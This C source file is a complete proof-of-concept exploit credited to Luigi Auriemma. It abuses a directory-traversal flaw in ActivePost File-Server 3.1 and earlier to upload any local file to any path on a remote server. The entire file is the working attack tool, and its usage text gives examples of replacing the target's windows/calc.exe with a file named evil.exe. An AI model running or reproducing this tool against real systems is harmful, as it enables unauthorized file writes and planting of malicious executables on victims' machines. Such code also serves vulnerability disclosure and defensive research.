/*

by Luigi Auriemma

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef WIN32
    #include <winsock.h>
    #include "winerr.h"

    #define close   closesocket
#else
    #include <unistd.h>
    #include <sys/socket.h>
    #include <sys/types.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <netinet/in.h>
#endif



#define VER     "0.1"
#define PORT    6004
#define BUFFSZ  4104    /* don't modify */



#define SEND    if(send(sd, buff, BUFFSZ, 0) \
                  < 0) std_err();
#define RECV    for(tot = 0; tot < BUFFSZ; tot += len) { \
                    len = recv(sd, buff + tot, BUFFSZ - tot, 0); \
                    if(len < 0) std_err(); \
                    if(!len) break; \
                }



u_long resolv(char *host);
void std_err(void);



int main(int argc, char *argv[]) {
    FILE    *fd;
    struct  sockaddr_in peer;
    int     sd,
            len,
            tot;
    u_short port = PORT;
    u_char  buff[BUFFSZ];


    setbuf(stdout, NULL);

    fputs("\n"
        "ActivePost File-Server <= 3.1 traversal file uploader "VER"\n"
        "by Luigi Auriemma\n"
        "e-mail: aluigi@altervista.org\n"
        "web:    http://aluigi.altervista.org\n"
        "\n", stdout);

    if(argc < 4) {
        printf("\nUsage: %s <local_filename> <remote_filename> <server> [port(%d)]\n"
            "\n"
            "  local_filename is the name of one of your local files that you wanna put on\n"
            "  the remote server.\n"
            "  remote_filename instead is the name you wanna give to the file and moreover\n"
            "  the traversal pattern (/..) to reach the desired path on which to put it.\n"
            "  Are needed at least 3 patterns to exit from the ActivePost Server folder,\n"
            "  like /../../../filename or /..../filename\n"
            "  However don't worry because the complete real remote path on which your file\n"
            "  is saved is EVER visible in the server reply.\n"
            "\n"
            "  Examples:\n"
            "    %s evil.exe /../../../windows/calc.exe localhost\n"
            "    %s evil.exe /..../windows/calc.exe localhost\n"
            "\n"
            "  In this case your file evil.exe will overwrite the calc.exe file of the\n"
            "  remote host (if ActivePost has been installed in c:\\).\n"
            "\n", argv[0], PORT, argv[0], argv[0]);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    printf("- open local file \"%s\"\n", argv[1]);
    fd = fopen(argv[1], "rb");
    if(!fd) std_err();

    if(argc > 4) port = atoi(argv[4]);

    peer.sin_addr.s_addr = resolv(argv[3]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;

    printf("- target   %s:%hu\n",
        inet_ntoa(peer.sin_addr),
        port);

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) std_err();

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))
      < 0) std_err();

    memset(buff, 0x00, BUFFSZ);

    fputs("- send first header\n", stdout);
    *(u_long *)buff = 0x1f5;
    SEND;
    RECV;

    printf("- send filename (%s)\n", argv[2]);
    *(u_long *)buff = 0x1f6;
    strncpy(buff + 8, argv[2], BUFFSZ - 8);
    SEND;
    RECV;

    printf("- upload file (%s)\n", argv[1]);
    *(u_long *)buff = 0x1f8;
    while((len = fread(buff + 8, 1, BUFFSZ - 8, fd))) {
        *(u_long *)(buff + 4) = len;
        SEND;
    }
    fclose(fd);

    memset(buff, 0x00, BUFFSZ);

    fputs("- send final header\n", stdout);
    *(u_long *)buff = 0x1f9;
    SEND;

    RECV;
    printf("- remote file has been saved exactly here:\n"
        "  %s\n", buff + 8);

    close(sd);
    fputs("- finished\n\n", stdout);
    return(0);
}



u_long resolv(char *host) {
    struct  hostent *hp;
    u_long  host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf("\nError: Unable to resolve hostname (%s)\n", host);
            exit(1);
        } else host_ip = *(u_long *)(hp->h_addr);
    }
    return(host_ip);
}



#ifndef WIN32
    void std_err(void) {
        perror("\nError");
        exit(1);
    }
#endif


